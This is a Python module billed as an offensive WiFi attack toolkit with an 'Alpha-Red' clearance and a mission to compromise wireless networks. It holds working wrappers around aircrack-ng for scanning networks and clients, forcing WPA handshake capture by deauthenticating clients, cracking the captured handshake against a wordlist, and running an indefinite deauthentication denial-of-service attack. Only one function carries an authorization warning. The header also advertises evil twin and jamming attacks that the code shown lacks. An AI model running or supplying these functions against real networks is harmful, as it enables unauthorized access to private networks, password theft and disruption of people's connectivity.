"""
KRYON WiFi Penetration - Attack Tools

Complete WiFi penetration testing toolkit.

Clearance Level: Alpha-Red (Offensive Wireless Operations)
Specialization: WiFi network exploitation and monitoring
Mission: Compromise wireless networks and pivot through WiFi

This module provides:
- WiFi scanning and monitoring
- WPA/WPA2 handshake capture
- WPA/WPA2/WPA3 cracking
- Evil twin and rogue AP attacks
- Deauthentication attacks
- WiFi jamming and DoS
"""

import os
import re
import subprocess
import time
from pathlib import Path
from typing import Any, Optional


def scan_wifi_networks(interface: str = "wlan0", timeout: int = 30, channel: Optional[int] = None) -> dict[str, Any]:
    """
    Scan for WiFi networks in range.

    Uses airodump-ng to discover all WiFi networks, including:
    - SSID and BSSID
    - Channel and frequency
    - Encryption type (WPA/WPA2/WPA3/WEP/Open)
    - Signal strength
    - Connected clients

    Args:
        interface: Wireless interface name (must be in monitor mode)
        timeout: Scan duration in seconds (default: 30)
        channel: Specific channel to scan (None = all channels)

    Returns:
        Dictionary containing:
        - networks: List of discovered networks with details
        - clients: List of connected clients
        - interface_mode: Current interface mode
        - scan_duration: Actual scan time
        - success: Whether scan completed
        - error: Error message if failed

    Example:
        >>> # Put interface in monitor mode first
        >>> enable_monitor_mode("wlan0")
        >>>
        >>> # Scan all networks
        >>> result = scan_wifi_networks("wlan0mon", timeout=60)
        >>> print(f"Found {len(result['networks'])} networks")
        >>>
        >>> for network in result['networks']:
        ...     print(f"SSID: {network['ssid']}")
        ...     print(f"  BSSID: {network['bssid']}")
        ...     print(f"  Channel: {network['channel']}")
        ...     print(f"  Encryption: {network['encryption']}")
        ...     print(f"  Signal: {network['power']} dBm")
        ...     print(f"  Clients: {network['clients']}")

    Network Details:
        - ssid: Network name (may be hidden)
        - bssid: MAC address of access point
        - channel: WiFi channel (1-14 for 2.4GHz, 36+ for 5GHz)
        - frequency: Frequency in MHz
        - encryption: WPA, WPA2, WPA3, WEP, OPN (Open)
        - cipher: TKIP, CCMP, GCMP
        - authentication: PSK, MGT (Enterprise)
        - power: Signal strength in dBm
        - beacons: Number of beacon frames
        - data: Number of data packets
        - clients: Number of connected clients
    """
    results = {
        "networks": [],
        "clients": [],
        "interface_mode": "",
        "scan_duration": 0,
        "success": False,
        "error": None,
    }

    try:
        # Verify interface exists
        check_iface = subprocess.run(["iwconfig", interface], capture_output=True, text=True)

        if check_iface.returncode != 0:
            results["error"] = f"Interface {interface} not found"
            return results

        # Check if in monitor mode
        if "Mode:Monitor" not in check_iface.stdout:
            results["error"] = f"Interface {interface} not in monitor mode. Run enable_monitor_mode() first."
            return results

        results["interface_mode"] = "monitor"

        # Output file for airodump-ng
        output_prefix = f"/tmp/skynet_wifi_scan_{int(time.time())}"

        # Build airodump-ng command
        cmd = ["airodump-ng"]

        if channel:
            cmd.extend(["-c", str(channel)])

        cmd.extend(["-w", output_prefix, "--output-format", "csv"])
        cmd.append(interface)

        # Run airodump-ng
        start_time = time.time()

        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Let it run for specified timeout
        time.sleep(timeout)

        # Stop airodump-ng
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()

        results["scan_duration"] = time.time() - start_time

        # Parse CSV output
        csv_file = f"{output_prefix}-01.csv"

        if os.path.exists(csv_file):
            networks, clients = _parse_airodump_csv(csv_file)
            results["networks"] = networks
            results["clients"] = clients

            # Cleanup temp files
            for file in Path("/tmp").glob(f"{os.path.basename(output_prefix)}*"):
                try:
                    file.unlink()
                except Exception:
                    pass

        results["success"] = True

    except FileNotFoundError:
        results["error"] = "airodump-ng not found - install with: apt-get install aircrack-ng"
    except Exception as e:
        results["error"] = str(e)

    return results


def enable_monitor_mode(interface: str = "wlan0") -> dict[str, Any]:
    """
    Enable monitor mode on wireless interface.

    Monitor mode allows capturing all WiFi traffic, not just traffic
    destined for your device.

    Args:
        interface: Wireless interface name (e.g., wlan0, wlan1)

    Returns:
        Dictionary containing:
        - monitor_interface: Name of monitor mode interface (e.g., wlan0mon)
        - original_interface: Original interface name
        - mode: Current mode (monitor/managed)
        - success: Whether operation succeeded
        - error: Error message if failed

    Example:
        >>> result = enable_monitor_mode("wlan0")
        >>> if result['success']:
        ...     print(f"Monitor mode enabled: {result['monitor_interface']}")
        ...     # Use this interface for attacks
        ...     scan_wifi_networks(result['monitor_interface'])

    Note:
        - Requires root privileges
        - May disconnect you from current WiFi
        - Use disable_monitor_mode() to restore managed mode
    """
    results = {
        "monitor_interface": "",
        "original_interface": interface,
        "mode": "",
        "success": False,
        "error": None,
    }

    try:
        # Kill interfering processes
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)

        # Enable monitor mode
        process = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)

        if process.returncode != 0:
            results["error"] = f"Failed to enable monitor mode: {process.stderr}"
            return results

        # Determine monitor interface name (usually wlan0mon)
        if "mon" in process.stdout:
            # Extract monitor interface name
            match = re.search(r"(\w+mon)", process.stdout)
            if match:
                results["monitor_interface"] = match.group(1)
            else:
                results["monitor_interface"] = f"{interface}mon"
        else:
            results["monitor_interface"] = interface

        results["mode"] = "monitor"
        results["success"] = True

    except FileNotFoundError:
        results["error"] = "airmon-ng not found - install with: apt-get install aircrack-ng"
    except Exception as e:
        results["error"] = str(e)

    return results


def disable_monitor_mode(interface: str = "wlan0mon") -> dict[str, Any]:
    """
    Disable monitor mode and restore managed mode.

    Args:
        interface: Monitor mode interface name (e.g., wlan0mon)

    Returns:
        Dictionary containing success status

    Example:
        >>> disable_monitor_mode("wlan0mon")
    """
    results = {"success": False, "error": None}

    try:
        subprocess.run(["airmon-ng", "stop", interface], capture_output=True, text=True, check=True)

        # Restart NetworkManager
        subprocess.run(["service", "NetworkManager", "start"], capture_output=True)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def capture_handshake(
    bssid: str,
    channel: int,
    interface: str = "wlan0mon",
    output_file: str = "/tmp/handshake",
    timeout: int = 300,
    deauth_clients: bool = True,
) -> dict[str, Any]:
    """
    Capture WPA/WPA2 4-way handshake.

    The handshake is captured when a client connects to the AP.
    Optionally deauthenticates clients to force reconnection.

    Args:
        bssid: Target access point MAC address
        channel: WiFi channel of target AP
        interface: Monitor mode interface
        output_file: Path to save capture file
        timeout: Maximum time to wait for handshake (seconds)
        deauth_clients: Send deauth packets to force reconnection

    Returns:
        Dictionary containing:
        - handshake_captured: Whether handshake was captured
        - capture_file: Path to .cap file with handshake
        - target_bssid: Target AP BSSID
        - clients_deauthed: Number of deauth packets sent
        - capture_duration: Time taken to capture
        - success: Whether operation completed
        - error: Error message if failed

    Example:
        >>> # First scan to find target
        >>> scan = scan_wifi_networks("wlan0mon")
        >>> target = scan['networks'][0]
        >>>
        >>> # Capture handshake
        >>> result = capture_handshake(
        ...     bssid=target['bssid'],
        ...     channel=target['channel'],
        ...     interface="wlan0mon",
        ...     deauth_clients=True
        ... )
        >>>
        >>> if result['handshake_captured']:
        ...     print(f"Handshake saved: {result['capture_file']}")
        ...     # Now crack it with aircrack-ng or hashcat

    Next Steps:
        After capturing handshake:
        1. Use crack_wpa_handshake() to crack the password
        2. Or convert to hashcat format and use hashcat
    """
    results = {
        "handshake_captured": False,
        "capture_file": "",
        "target_bssid": bssid,
        "clients_deauthed": 0,
        "capture_duration": 0,
        "success": False,
        "error": None,
    }

    try:
        # Start airodump-ng to capture handshake
        airodump_cmd = [
            "airodump-ng",
            "-c",
            str(channel),
            "--bssid",
            bssid,
            "-w",
            output_file,
            interface,
        ]

        airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        start_time = time.time()

        # If deauth enabled, send deauth packets
        if deauth_clients:
            time.sleep(5)  # Let airodump start

            # Send deauth packets to all clients
            deauth_cmd = [
                "aireplay-ng",
                "--deauth",
                "10",  # 10 deauth packets
                "-a",
                bssid,  # AP BSSID
                interface,
            ]

            subprocess.run(deauth_cmd, capture_output=True, timeout=30)

            results["clients_deauthed"] = 10

        # Wait for handshake or timeout
        handshake_found = False
        check_interval = 10  # Check every 10 seconds

        while (time.time() - start_time) < timeout:
            time.sleep(check_interval)

            # Check if handshake captured
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                # Verify handshake with aircrack-ng
                check = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)

                if "1 handshake" in check.stdout or "handshake" in check.stdout.lower():
                    handshake_found = True
                    results["handshake_captured"] = True
                    results["capture_file"] = cap_file
                    break

        # Stop airodump-ng
        airodump_process.terminate()
        try:
            airodump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump_process.kill()

        results["capture_duration"] = time.time() - start_time

        if not handshake_found:
            results["error"] = (
                "Handshake not captured within timeout. Try increasing timeout or ensure clients are connected."
            )

        results["success"] = True

    except FileNotFoundError as e:
        if "aireplay-ng" in str(e):
            results["error"] = "aireplay-ng not found - install aircrack-ng suite"
        else:
            results["error"] = str(e)
    except Exception as e:
        results["error"] = str(e)

    return results


def crack_wpa_handshake(
    capture_file: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    bssid: Optional[str] = None,
) -> dict[str, Any]:
    """
    Crack WPA/WPA2 handshake using aircrack-ng.

    Args:
        capture_file: Path to .cap file with handshake
        wordlist: Path to wordlist file
        bssid: Target BSSID (if multiple in capture file)

    Returns:
        Dictionary containing:
        - password_found: Whether password was cracked
        - password: The cracked password (if found)
        - keys_tested: Number of passwords tried
        - success: Whether operation completed

    Example:
        >>> # After capturing handshake
        >>> result = crack_wpa_handshake(
        ...     capture_file="/tmp/handshake-01.cap",
        ...     wordlist="/usr/share/wordlists/rockyou.txt"
        ... )
        >>>
        >>> if result['password_found']:
        ...     print(f"Password: {result['password']}")
        >>> else:
        ...     print("Password not in wordlist")

    Note:
        For GPU-accelerated cracking, convert to hashcat format:
        - Use hcxpcapngtool to convert .cap to .hc22000
        - Then use hashcat with mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
    """
    results = {
        "password_found": False,
        "password": "",
        "keys_tested": 0,
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(capture_file):
            results["error"] = f"Capture file not found: {capture_file}"
            return results

        if not os.path.exists(wordlist):
            results["error"] = f"Wordlist not found: {wordlist}"
            return results

        # Build aircrack-ng command
        cmd = ["aircrack-ng", "-w", wordlist]

        if bssid:
            cmd.extend(["-b", bssid])

        cmd.append(capture_file)

        # Run aircrack-ng
        process = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=3600,  # 1 hour max
        )

        # Parse output
        output = process.stdout + process.stderr

        # Check for success
        if "KEY FOUND!" in output:
            # Extract password
            match = re.search(r"KEY FOUND! \[ (.+) \]", output)
            if match:
                results["password_found"] = True
                results["password"] = match.group(1)

        # Extract keys tested
        match = re.search(r"Tested (\d+) keys", output)
        if match:
            results["keys_tested"] = int(match.group(1))

        results["success"] = True

    except subprocess.TimeoutExpired:
        results["error"] = "Cracking timed out (1 hour limit)"
    except FileNotFoundError:
        results["error"] = "aircrack-ng not found"
    except Exception as e:
        results["error"] = str(e)

    return results


def deauth_attack(
    bssid: str,
    interface: str = "wlan0mon",
    client: Optional[str] = None,
    packet_count: int = 0,
    duration: int = 60,
) -> dict[str, Any]:
    """
    Perform deauthentication attack on WiFi network.

    Sends deauth packets to disconnect clients from AP.
    Useful for:
    - Forcing handshake capture
    - Denial of service
    - Forcing clients to connect to evil twin

    Args:
        bssid: Target access point MAC address
        interface: Monitor mode interface
        client: Specific client to deauth (None = all clients)
        packet_count: Number of deauth packets (0 = infinite)
        duration: Attack duration in seconds (for infinite mode)

    Returns:
        Dictionary containing:
        - packets_sent: Estimated number of packets sent
        - target_bssid: Target AP
        - target_client: Specific client or "broadcast"
        - duration: Attack duration
        - success: Whether operation completed

    Example:
        >>> # Deauth all clients from AP for 30 seconds
        >>> result = deauth_attack(
        ...     bssid="AA:BB:CC:DD:EE:FF",
        ...     interface="wlan0mon",
        ...     duration=30
        ... )
        >>>
        >>> # Deauth specific client
        >>> result = deauth_attack(
        ...     bssid="AA:BB:CC:DD:EE:FF",
        ...     client="11:22:33:44:55:66",
        ...     packet_count=50
        ... )

    Warning:
        - This is a DoS attack
        - Only use on networks you own or have permission to test
        - May be illegal without authorization
    """
    results = {
        "packets_sent": 0,
        "target_bssid": bssid,
        "target_client": client or "broadcast",
        "duration": 0,
        "success": False,
        "error": None,
    }

    try:
        # Build aireplay-ng command
        cmd = ["aireplay-ng", "--deauth"]

        if packet_count > 0:
            cmd.append(str(packet_count))
        else:
            cmd.append("0")  # Infinite

        cmd.extend(["-a", bssid])

        if client:
            cmd.extend(["-c", client])

        cmd.append(interface)

        # Run attack
        start_time = time.time()

        if packet_count > 0:
            # Fixed number of packets
            process = subprocess.run(cmd, capture_output=True, timeout=120)
            results["packets_sent"] = packet_count
        else:
            # Infinite mode - run for duration
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            time.sleep(duration)

            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

            # Estimate packets sent (roughly 10-20 per second)
            results["packets_sent"] = duration * 15

        results["duration"] = time.time() - start_time
        results["success"] = True

    except FileNotFoundError:
        results["error"] = "aireplay-ng not found"
    except Exception as e:
        results["error"] = str(e)

    return results


def _parse_airodump_csv(csv_file: str) -> tuple:
    """Parse airodump-ng CSV output."""
    networks = []
    clients = []

    try:
        with open(csv_file, encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # Split into networks and clients sections
        sections = content.split("\r\n\r\n")

        if len(sections) >= 1:
            # Parse networks (APs)
            network_lines = sections[0].split("\n")[2:]  # Skip header
            for line in network_lines:
                if not line.strip():
                    continue

                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    network = {
                        "bssid": parts[0],
                        "first_seen": parts[1],
                        "last_seen": parts[2],
                        "channel": parts[3],
                        "speed": parts[4],
                        "privacy": parts[5],
                        "cipher": parts[6],
                        "authentication": parts[7],
                        "power": parts[8],
                        "beacons": parts[9],
                        "iv": parts[10],
                        "lan_ip": parts[11],
                        "id_length": parts[12],
                        "ssid": parts[13],
                        "encryption": parts[5],  # Privacy field
                        "clients": 0,  # Will be counted from clients section
                    }
                    networks.append(network)

        if len(sections) >= 2:
            # Parse clients
            client_lines = sections[1].split("\n")[2:]  # Skip header
            for line in client_lines:
                if not line.strip():
                    continue

                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 6:
                    client = {
                        "station": parts[0],
                        "first_seen": parts[1],
                        "last_seen": parts[2],
                        "power": parts[3],
                        "packets": parts[4],
                        "bssid": parts[5],
                        "probed_ssids": parts[6] if len(parts) > 6 else "",
                    }
                    clients.append(client)

                    # Count clients for each network
                    for network in networks:
                        if network["bssid"] == client["bssid"]:
                            network["clients"] += 1

    except Exception:
        pass

    return networks, clients
